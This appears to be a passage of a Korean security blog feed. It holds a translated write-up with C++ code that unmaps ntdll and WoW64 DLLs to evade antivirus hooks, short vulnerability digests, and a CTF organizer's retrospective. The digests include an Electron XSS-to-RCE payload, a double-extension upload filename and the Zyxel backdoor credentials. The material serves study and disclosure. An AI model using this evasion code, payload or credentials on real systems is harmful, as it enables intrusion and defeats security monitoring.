때이다.</p><blockquote><p>WOW64는 x86 예외에 대한 전송으로 native x64, ia64 또는 ARM64 예외를 사용한다. 따라서 WOW64에서 동작하는 32비트 응용 프로그램에서 포착되지 않은 예외는 native 64비트 예외처럼 동작한다.</p></blockquote><p>4GB 경계 위의 주소에 64비트 쉘 코드를 쓸 수 있는데, 64비트 공간에 64비트 벡터 예외 처리기(Vectored Exception Handler)를 설치하며 32비트 예외에 의해 트리거 되고 Control Flow가 64bit VEH에 의해 리다이렉션 된다.</p><p><img src="/2021/01/10/idioth/memfuck/image5.png"></p><p>32비트 ntdll이 로드되어 제대로 됐음을 확신했다. 모든 것이 unmap 된 예외를 트리거하는 것은 쉽지만 처리할 WoW64 레이어로 전환할 코드가 없다. 하지만 이 아이디어에는 많은 흥미로운 잠재력이 있다.</p><h2 id="Ntdll-No-More"><a href="#Ntdll-No-More" class="headerlink" title="Ntdll No More"></a>Ntdll No More</h2><p>더 이상 어떤 목적을 위해서든 ntdll에 의존하지 않는다는 원래 개념으로 돌아가서 WoW64 계층에 남은 3개의 dll을 unmapping 하는 일이 남았다. WoW64는 대부분 시스템에서 거의 동일하다.(WoW64.dll, wow64win.dll, ntdll.dll)</p><p><img src="/2021/01/10/idioth/memfuck/image6.png"></p><p>32비트 코드로 돌아가지 않을 것이라고 생각하니 더 이상 필요하지 않은 이 dll들을 unmap 하자.</p><pre><code class="hljs cpp">DWORD64 addrWoW64 = <span class="hljs-number">0</span>;  DWORD64 addrWoW64Win = <span class="hljs-number">0</span>;  DWORD64 addrNtdll = <span class="hljs-number">0</span>;  PPEB peb64 = getPEB();  LIST_ENTRY* first = peb64-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;  LIST_ENTRY* ptr = first;  <span class="hljs-keyword">int</span> cntr = <span class="hljs-number">0</span>;  <span class="hljs-keyword">do</span> &#123;    LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);    ptr = ptr-&gt;Flink;    <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">1</span>) &#123;      addrNtdll = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">2</span>) &#123;      addrWoW64 = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">3</span>) &#123;      addrWoW64Win = (DWORD64)dte-&gt;DllBase;    &#125;    cntr++;  &#125; <span class="hljs-keyword">while</span> (ptr != first);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64Win);</code></pre><p><img src="/2021/01/10/idioth/memfuck/image7.png"></p><p>32비트 주소 공간에 더 이상 hook은 존재하지 않으며 WoW64 dll(Wow64SystemServiceEx 등)에 있는 것도 다 사라졌다. 남은 일은 ntdll을 unmap 하는 것이다. 다시 한번 부모 모듈에서 NtUnmapViewOfSection을 호출하는 문제가 생겼다. 직접 system call을 하자.</p><p>64비트 MSVC 컴파일러가 inline assembly를 제공하지 않으므로 function ordering, 내부 코드 배치 제한으로 인해 system call stub에 새로운 메모리 영역을 할당하기로 결정했다. 윈도우 10 64비트의 Syscall stub은 아래와 같다.</p><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rcx</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, xxh<span class="hljs-keyword">syscall</span><span class="hljs-keyword">retn</span></code></pre><p>NtdllVirtualMemory를 호출하고 DWORD by DWORD로 코드를 작성해라. 그리고 typedef prototype을 할당하면 Nt* 함수를 쉽게 호출할 수 있다.</p><pre><code class="hljs cpp">DWORD dwCode1 = <span class="hljs-number">0xb8d18b4c</span>;  DWORD dwCode2 = <span class="hljs-number">0x0000002a</span>; <span class="hljs-comment">// syscall code for NtUnmapViewOfSection</span>  DWORD dwCode3 = <span class="hljs-number">0x90c3050f</span>;  <span class="hljs-comment">// mov r10, rcx ; 0x4c 0x8b 0xd1</span>  <span class="hljs-comment">// mov eax, xxh ; 0xb8 xx 00 00 00</span>  <span class="hljs-comment">// syscall ; 0x0f 0x05</span>  <span class="hljs-comment">// retn ; 0xc3</span>  *(DWORD*)syscallbase = dwCode1;  *((DWORD*)syscallbase + <span class="hljs-number">1</span>) = dwCode2;  *((DWORD*)syscallbase + <span class="hljs-number">2</span>) = dwCode3;  p_SysUnmapViewOfSection sysUnmap = (p_SysUnmapViewOfSection)syscallbase;</code></pre><p>마지막으로 64비트 ntdll에 대해 NtUnmapViewOfSection의 직접적인 system call 후에 프로세스에는 아무것도 없다. 안티 바이러스가 시도하고 hook 하는 user-mode에 남은 것이 없다. 주입된 DLL이 unmap 된지는 오래됐다.</p><p><img src="/2021/01/10/idioth/memfuck/image8.png"></p><p>여기부터 Rtl* 함수 사용 없이 syscall을 통해 직접 code injection이나 detected code를 실행하는 것이다. 이것을 하면서 WoW64에 관해 많은 것을 배웠고, 한계점과 특이점, 32비트와 64비트 VEH 같은 새로운 탐구 영역을 얻었다.</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><p><a href="https://github.com/jackullrich/memfuck">Github 주소</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>memfuck</tag>
      
      <tag>hook</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PsExec 0-day LPE non-official patch</title>
    <link href="/2021/01/09/fabu1ous/2021-01-09/"/>
    <url>/2021/01/09/fabu1ous/2021-01-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.0patch.com/2021/01/local-privilege-escalation-0day-in.html">LPE 0day in PsExec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows xp ~ Windows 10</p><p>PsExec v1.72</p><p>PsExec v2.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PsExec를 사용하는 시스템에서 System 권한을 획득할 수 있는 전형적인 named pipe hijacking <a href="https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/">취약점</a>이 패치되었습니다. 해커는 PsExec가 기존에 존재하는 named pipe를 재사용할 때 권한 설정을 변경하지 않는다는 점을 악용해 System권한을 갖는 named pipe를 사용할 수 있게 되고 System 권한으로 임의의 프로세스를 생성할 수 있습니다.</p><p>0Patch는 이 취약점에 대한 패치를 공개하고 무료로 배포하고 있습니다. PsExec 서비스는 원격 request를 받아 처리하는 thread를 생성할 때 <code>CreateNamedPipe()</code>를 호출합니다. 0Patch가 공개한 패치에선 <code>CreateNamedPipe()</code>가 호출되기 전 <code>FILE_FLAG_FIRST_PIPE_INSTANCE</code> 플레그 값을 사용해 <code>CreateNamedPipe()</code>를 한 번 더 호출하는 것으로 동일한 이름의 named pipe가 존재하는지 확인합니다. 만약 동일한 이름의 named pipe가 이미 존재하면 Psexesvc.exe를 종료합니다.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p><a href="https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp">https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-29669 : WIFI SD Hub Privilege Escalation Plugin</title>
    <link href="/2021/01/08/l0ch/2021-01-08/"/>
    <url>/2021/01/08/l0ch/2021-01-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/code-byter/CVE-2020-29669">https://github.com/code-byter/CVE-2020-29669</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Macally WIFISD2-2A82 Travel Router (펌웨어 버전 : 2.000.010)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>무선 미디어 공유가 가능한 WIFI SD 허브인 Macally WIFISD2-2A82 제품에서 root로 권한 상승이 가능한 취약점이 공개되었습니다.</p><p>취약점의 세부 공격 단계는 아래와 같습니다.</p><ol><li>해커는 웹 인터페이스에서 게스트 계정으로 로그인합니다.</li><li>패스워드 재설정 페이지에서 admin의 패스워드로 설정할 값을 입력합니다.</li><li>BurpSuite로 해당 요청에서 <code>name</code> 필드값을 admin으로 변경해 요청하면 admin의 패스워드가 재설정됩니다.</li><li>telnet을 통해 admin과 재설정한 패스워드를 입력해 접속하면 <code>/etc/passwd</code> 의 root를 포함한 모든 계정의 패스워드 해시를 유출할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 패스워드 해시를 크래킹해 root 쉘에 접근할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>wifi sd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SoftMaker Office TextMaker에서 발견된 세 가지 취약점</title>
    <link href="/2021/01/07/idioth/2021-01-07/"/>
    <url>/2021/01/07/idioth/2021-01-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/01/vuln-spotlight-softmaker-office-textmaker-jan-2021.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+feedburner/Talos+(Talos%E2%84%A2+Blog)">Vulnerability Spotlight: Multiple vulnerabilities in SoftMaker Office TextMaker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SoftMaker Software GmbH SoftMaker Office TextMaker 2021, revision 1014</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SoftMaker Software GmbH는 오피스 소프트웨어를 개발하는 독일 소프트웨어 회사입니다. 플래그십 제품인 SoftMaker Office는 워드, 스프레드 시트, 프레젠테이션, 스크립트 등등의 기능을 지원합니다. 이 Office 제품군인 TextMaker의 document parsing 기능에서 세 가지 취약점이 발견되었습니다.</p><p><strong>CVE-2020-13544: Sign-extension</strong></p><p>document parser가 record를 parsing 할 때 index table record를 16bit unsigned 값으로 사용하지만 루프 문에서 index를 비교할 때 16bit signed 값으로 사용하여 index table record에 지정된 크기보다 많은 횟수를 반복할 수 있습니다. 따라서 index를 통해 heap 할당 범위 밖에 접근할 수 있습니다.</p><p><strong>CVE-2020-13545: Integer conversion</strong></p><p>document parser가 record를 스캔하고 읽어 올 때 파일 스트림의 현재 위치에서 record에서 사용하는 바이트 크기를 나타내는 32bit integer를 읽어옵니다. 버퍼를 할당할 때 signed multiplication을 사용하지만 버퍼의 끝을 계산할 때 unsigned multiplication을 사용하여 heap 할당 범위 밖의 주소에 접근할 수 있습니다.</p><p><strong>CVE-2020-13546: Integer overflow</strong></p><p>document parser가 record를 parsing 할 때 파일에서 32비트 값을 읽어 <code>0x23c</code>를 곱합니다. 피연산자는 최대 10비트이므로 overflow 되어 32비트로 잘려서 heap에 할당됩니다. 하지만 곱셈 하기 전의 값을 스택에 저장하고 사용하여 할당된 범위 밖에 값이 써지게 됩니다.</p><p>세 가지 취약점 모두 취약점을 트리거하기 위해 해커는 타깃이 문서를 열도록 유도해야 합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>sign extension</tag>
      
      <tag>integer conversion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35717: RCE through XSS</title>
    <link href="/2021/01/06/fabu1ous/2021-01-06/"/>
    <url>/2021/01/06/fabu1ous/2021-01-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>문서 작성 Electron App인 zonote에서 RCE 취약점이 공개되었습니다. zonote 문서에 마크다운과 html을 삽입해 XSS(Cross-Site-Script) 공격을 할 수 있는데 악용 범위를 RCE까지 확장할 수 있습니다. </p><blockquote><p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p></blockquote><p><a href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron의 공식문서</a>에 따르면 원격 콘텐츠에 접근하는 모든 renderer는 Node.js intergration이 비활성화되어있어야 합니다. XSS 취약점이 존재해도 그 악용 범위를 renderer 내부로 제한하기 위해 Electron 5.0.0부터 권장해온 기본 설정입니다. </p><ul><li>다음은 zonote의 main.js코드 일부입니다.</li></ul><pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = &#123;    ...    webPreference: &#123;        nodeIntergration : <span class="hljs-literal">true</span>,        enableRemoteModule : <span class="hljs-literal">true</span>    &#125;&#125;</code></pre><p>Node.js intergration이 활성화되어있으므로 XSS를 통한 RCE 취약점이 존재합니다.</p><ul><li>PoC</li></ul><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span class="hljs-string">&quot;</span></span></span><span class="xml">try&#123;</span><span class="xml">const &#123;shell&#125; = require(&#x27;electron&#x27;);</span><span class="xml">shell.openExternal(&#x27;file:C:/Windows/System32/calc.exe&#x27;)</span><span class="xml">&#125;catch(e)&#123;</span><span class="xml">console.error(e)</span><span class="xml">&#125;&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35489 : Unrestricted File Upload Vulnerability in WordPress Plugin</title>
    <link href="/2021/01/05/l0ch/2021-01-05/"/>
    <url>/2021/01/05/l0ch/2021-01-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.wpsec.com/contact-form-7-vulnerability/">https://blog.wpsec.com/contact-form-7-vulnerability/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Contact Form ≤ 7 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 플러그인인 Contact Form 7은 폼메일 플러그인으로 폼메일 양식을 쉽게 생성할 수 있어 인기 있는 플러그인 중 하나입니다. 해당 플러그인에서 허용되지 않은 확장자 필터링을 우회해 업로드할 수 있는 취약점이 발견되었습니다.</p><p>취약점의 세부 정보는 다음과 같습니다.</p><ol><li>해커는 특수 문자가 포함된 이중 확장자 파일을 업로드할 수 있습니다. ex) <code>mal.php .jpg</code> (공백  = \t)</li><li>Contact Form 7은 업로드된 파일 이름에서 특수 문자를 제거하지 않아 첫 번째 확장자 이후 구분 문자로 인해 두 번째 파일 확장자를 버립니다.</li><li>결과적으로 업로드되는 파일 이름은 <code>mal.php</code>가 되고 업로드에 성공합니다.</li><li>해커는 임의 코드 실행을 통해 업로드된 파일에 접근 및 실행이 가능합니다.</li></ol><p>해커는 이를 악용해 서버에 웹쉘과 같은 파일을 제한 없이 업로드할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dn9uy3n/Check-WP-CVE-2020-35489">https://github.com/dn9uy3n/Check-WP-CVE-2020-35489</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>unrestricted file upload</tag>
      
      <tag>wordpress</tag>
      
      <tag>plugin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-29583: Zyxel 방화벽, VPN 제품에서 백도어 계정 발견</title>
    <link href="/2021/01/04/idioth/2021-01-04/"/>
    <url>/2021/01/04/idioth/2021-01-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/01/secret-backdoor-account-found-in.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+TheHackersNews+(The+Hackers+News+-+Cyber+Security+Blog)">Secret Backdoor Account Found in Several Zyxel Firewall, VPN Products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>방화벽<ul><li>ZLD V4.60 펌웨어를 사용하는 ATP, USG, USG FLEX, VPN 시리즈</li></ul></li><li>AP 컨트롤러<ul><li>NXC 2500, NXC5500</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zyxel은 해커가 펌웨어에 하드 코딩된 undocumented account(FTP를 통한 자동 펌웨어 업데이트 제공을 위한 계정)를 통해 관리자 권한으로 로그인하고 네트워크 장비를 손상시킬 수 있는 취약점에 대한 패치를 발표했습니다.</p><p>이 취약점은 CVE-2020-29583으로 undocumented account인 <code>zyfwp</code>와 수정할 수 없는 비밀번호 <code>PrOw! aN_fXp</code>가 평문으로 저장되어 있으며 해당 계정을 통해 해커가 SSH 서버나 웹 인터페이스에 관리자 권한으로 접근할 수 있습니다.</p><pre><code class="hljs routeros">$ ssh zyfwp@192.168.1.252Password: Pr*******XpRouter&gt; show<span class="hljs-built_in"> users </span>current<span class="hljs-literal">No</span>: 1  Name: zyfwp  Type: admin(<span class="hljs-built_in">..</span>.)Router&gt;</code></pre><p>이 취약점을 악용해 해커는 방화벽의 설정을 조작하여 특정 트래픽을 허용하거나 막을 수 있고, 트래픽을 가로채거나 VPN 계정을 생성하여 네트워크에 대한 접근 권한을 가질 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html">https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>zyxel</tag>
      
      <tag>undocumented account</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Daily-Life] 크리스마스 CTF 2020 운영 후기</title>
    <link href="/2021/01/03/idioth/christmasctf2020-review/"/>
    <url>/2021/01/03/idioth/christmasctf2020-review/</url>
    
    <content type="html"><![CDATA[<h1 id="사건의-전말"><a href="#사건의-전말" class="headerlink" title="사건의 전말"></a>사건의 전말</h1><p>매년 크리스마스에 이벤트 형식으로 열리는 솔로들을 위한(?) 크리스마스 CTF의 주최를 이번에 세종대학교 정보보안 동아리 SSG와 함께 맡았습니다. 사실 우리가 문제를 만들어야 된다는 이야기도 갑자기 들었죠. Fabu1ous는 맡게 된 과정을 눈 앞에서 목격했으나 idioth과 L0ch는 통보를 받았습니다…</p><blockquote><p>??? : 크리스마스 때 뭐하냐<br>idioth : 데이트요<br>??? : 여자 친구 없잖아<br>idioth : 그때는 있겠죠<br>??? : 문제나 만들어라<br>L0ch : 전 있는데용 ㅎㅎ<br>??? : 알 바 아니고</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image0.png"></p><p>불안한 직감은 언제나 옳습니다. ‘우리 문제 만들어야 돼’를 듣자마자 직감했습니다. 아 크리스마스 CTF구나… 처음엔 인당 두 문제씩 만들기로 했습니다. 하지만 여기서 사건이 하나 벌어지는데…</p><p>데이터 챌린지를 나가기로 했었는데 팀장 녀석이 분야를 착각해서 신청을 못했습니다. 그로 인해 각 3문제를 만들기로…ㅋㅋㅋㅋ</p><blockquote><p>idioth : 얘들아 우리 세 문제씩 만들기로 했어 ㅎㅎ<br>L0ch, Fabu1ous : ???<br>idioth : 데이터 챌린지 신청 못함 ㅋㅋㅋㅋㅋㅋ</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image1.png"></p><p>처음에 만들기로 한 문제에 대한 버그 클래스는 아래와 같습니다만…</p><ul><li>idioth<ul><li>rev : custom packer</li><li>web : cve-2020-9484 tomcat rce</li><li>misc : snake</li></ul></li><li>L0ch<ul><li>pwn : Windows pwnable uaf</li><li>pwn : Linux pwnable type confusion</li><li>rev : obfuscate</li></ul></li><li>Fabu1ous<ul><li>pwn : angr challenge</li><li>pwn : uninit stack</li><li>misc : 미정</li></ul></li></ul><p>여러 가지 이유로 많이 바뀌었습니다… 코로나 때문에 갑자기 학기가 1주일 당겨지면서 11월과 12월 초가 통째로 바빠질 줄은 그들은 몰랐습니다…</p><p>학기가 끝난 후 그들은 랩실에 갇혀서 근 1주일을 밤새며 문제를 만들기에 박차를 가하게 됩니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image2.png"></p><p>대회 전날 그들의 모습</p><h1 id="idioth"><a href="#idioth" class="headerlink" title="idioth"></a>idioth</h1><p>안녕하세요. idioth입니다. 뭐… 처음에 대회를 한다 했을 때는 좀 많이 당황했습니다.</p><p>일단 5월 중순에 소집 해제하고 이제 막 다시 공부를 시작한 참이라서… 출제하기 전까지 CTF를 2개 정도 나갔는데 문제를 baby-rev 정도밖에 못 풀었습니다. 뭔가 좀 많이 바뀐 것 같더라고요. 포너블을 내기에는 기억도 어렴풋하고…</p><p>암호 공부를 해야겠다는 생각은 늘 하고 있었는데 최근에 어떤 문제들이 많은가 봤더니 암호랑 접목을 많이 시켜서 나오더라고요. 일단 암호는 내가 할 줄 모르니 패스… 그럼 뭐 만들지? 하다가 복무 중에 했던 Custom Packer 스터디가 떠올랐습니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image3.png"></p><p>아! 이거다! 패커 딱 대!</p><p>문제 만들어야 된다는 소리를 들은 후 주제를 대충 정한 후 바로 다음 달부터 패커 개발에 들어갔습니다. 일단 패커 관련된 문제가 나오지 않았다는 것은… 다들 아시죠? (ㅎㅎ)</p><ol><li>64비트로 만들자</li><li>어 내가 그때 스터디했던 건 32비트네?</li><li>너무 옛날 거네? 게다가 게시글도 사라졌네?</li><li>…github에 올라와있는 걸 보고 어떤 흐름으로 가면 좋은 지 보자</li></ol><p>그리고 열심히 열심히 한 달에 걸쳐서 완성을 했습니다! 역시 난 한다면 하는 남자! 하지만…</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image4.png"></p><p>코드를 계속 보는데도 도대체 어디가 문제인지 모르겠습니다… 아 시간이 없는데 이제 과제 폭풍이 몰려오고 있는데… 어떡하지?</p><p>일단 tomcat부터 만들자… tomcat 자체에 취약점이 있으니 웹 사이트 구현하고 트리거할 수 있게 기능 구현만 하면 되니까 금방 하겠지? 웹 하는 애들이 도와준댔어.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image5.png"></p><p>응 그런거 없어~ 웹 만들어 본거라곤 공부 처음 시작할 때 html, php와 django를 통해 만들어 본 것이 전부라서 맨 땅에 헤딩을 하면서 구현을 시작했습니다. 게다가 학교에서 python 학부 수업 조교도 진행해서 뭔가 할 일이 굉장히 많았죠(핑계야)</p><blockquote><p>기상 - 하루 한 줄 - 조교 - 과제 - (블로그 글) - 문제 만들기</p></blockquote><p>위의 순환을 계속 돌았습니다. 겉으로의 구현도 끝나고 파일 업로드 등의 구현도 11월 말에 다 끝났습니다. 하지만 가장 큰 문제가 있었습니다.</p><p>버전은 어떻게 알려 줄 것이고 지금 상태에선 session 폴더와 모든 것이 게싱이다.</p><p>여러 가지 사람들과 이야기를 해본 끝에 LFI를 통해서 모든 파일을 다 읽을 수 있게 하도록 했습니다.</p><p>그 과정에서 path traversal 필터링을 거는 게 좋을까 말까에 대해서는 그래도 <code>../</code> 같은 기본적인 거는 걸어놓는 게 좋지 않을까?라는 생각을 했습니다.</p><p>근데 주변에서 어차피 그런 거 보이면 일단 때려 넣고 보니까 기본적인 거는 걸어놓는 게 좋아.라는 말을 듣고 <code>gift</code> 문제가 탄생하게 됩니다.</p><p>다 만들었을 때는 그래도 웹 처음 만든 것 치고 괜찮은 것 같은데?라는 생각을 했으나… 저의 오만함이었음을 깨달았습니다. 으으… 저는 게싱을 최대한 줄였다고 생각했지만 제가 만들었던 문제라서 그렇게 생각했던 것 같습니다 ㅜㅜ…</p><p>하지만 가장 큰 문제는 <code>gift</code> 하나 만들었는데 대회가 일주일 남았다.</p><p>일단 리버싱 문제를 하나 만들어야지… 그냥 간단한 것 내야겠다… crackme 하나 해야지~ 하고 만들었습니다. 근데 뭔가 너무 허전해서 고민을 했습니다. 아 뭔가 없나… 하다가 딱 생각이 났습니다.</p><p>오 이제 맥도 ARM으로 나오는데 ARM 리버싱 할까? ㄱㄱㄱㄱ arm 어셈 분석하는 걸로 내고~ ida hexrays를 막아놓자. 어차피 잘하시는 분들은 arm도 금방 보실 테고 하니까 anti-hexrays는 금방 푸시겠지?</p><p>ida에서는 깨져서 나오는데… 왜 ghidra에서는 제대로 나오는 걸까…?</p><p>??? : 야 그냥 핸드 레이로 내자</p><p>idioth : ㄱ 어차피 baby 용으로 낸 거니까 괜찮겠지?</p><p>-<code>lock</code> 끝-</p><p>아 이제 snake 하나만 남았네요 ㅎㅎ misc 문제라서 너무 부담이 없습니다~ 뱀 게임 재미나게 하나 만들어야지<del>~</del>하고 생각하는 와중에 앞을 보니까 절망의 구렁텅이에 빠진 한 남자가 있었습니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image6.png"></p><blockquote><p>L0ch : 나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼</p></blockquote><p>앞에서 보는데 진짜 너무 무섭더라고요. 그래서 그냥 제 misc 문제를 주고 reversing을 제가 내기로 했습니다. 참가한 대회 중 하나에서 angr로 푼 문제가 있어서 angr 문제를 내자. 근데 이것도 arm으로 내면 재밌겠당. 하고 후딱 만들었습니다.</p><p>근데 arm에서는 왜 simulation manager를 돌려도 값이 안 나오지? 그냥 x64로 완성하고 난 후 L0ch를 보니 뱀 게임을 완성하고 자기 type confusion 못 만들 것 같은데 baby pwnable 뭐 낼 지 물어보더라고요. 그래서 그냥 던져 줬습니다. arm rop 재밌을 듯? <code>baby_RudOlPh</code> 탄생~</p><p>근데 angr 문제를 검수하고 값을 연산하는 로직을 수정하고 나니까 이상하게 값이 밀려서 나왔습니다. 처음에 c++로 짰었고 전체적으로 계속 수정을 했는데 input이 이상하게 들어가거나 해서 코드가 전체적으로 꼬여버렸습니다. 결국 c로 옮기게 되었고 c로 옮겨서 나오는 값들을 확인해보자 byte 몇 개가 사라지더라고요.</p><p>대회는 당장 내일이고 급하니까 범위가 넘어가서 그런가 보다 생각하고 그냥 크게 연산하는 로직들을 지워버리고 만들었습니다. 그렇게 <code>angrforge</code> 탄생. 사실 이 문제는 욕먹을 거라 생각했습니다. 손으로 푸신 분 계시던데 진짜 죄송합니다… 다음에 문제 만들 일이 생긴다면 이런 *** 같은 의도 파악조차 안 되는 문제는 만들지 않겠습니다.</p><p>대회는 여차저차 잘 끝났지만 마음이 불편했습니다. 나는 나대로 열심히 했는데 결과물이 좋지 않았으니까요. 일단 내가 생각한 대로 만들어진 문제가 없었습니다. <code>lock</code>이나 <code>angrforge</code> 같은 경우는 시간에 쫓겨 로직에 대한 큰 고민 없이 만든 문제들이라서 마음에 들지 않았습니다.</p><p>거의 대부분의 문제 제작 시간을 <code>gift</code>에 쏟았고, 실제 이러한 서비스가 운영돼서 이 취약점이 존재한다면 이렇게 접근하면 재밌겠다.라는 시나리오도 잘 만들었다고 생각했습니다.</p><p>근데 이건 출제자의 생각이지 참여하신 분들이 그렇게 생각 안 하신다면 그게 맞는 거죠.</p><p>대회가 끝나고 나서 심야 버스를 타고 집으로 출발했습니다. 거의 40시간 넘게 깨어 있었던 것 같네요. 버스에서 잠도 안 오더군요. 그냥 현타가 세게 왔습니다.</p><p>아… 내가 진짜 못하는구나. 내가 생각했던 것이나 다른 문제들을 풀거나 분석하면서 봤던 로직들을 구현하지도 못하고, 생각의 넓이나 깊이도 부족하구나. 내가 생각한 것보다 사람들은 더 넓은 것을 보는구나.</p><p>돌이켜 생각해보니 사람들이 봤을 때 주제나 컨셉이 재밌고 신선한 것에만 너무 신경 쓰지 않았나? 내가 사람들에게 그 재미를 온전히 전달할 만큼의 기본 베이스가 되는가?라는 생각이 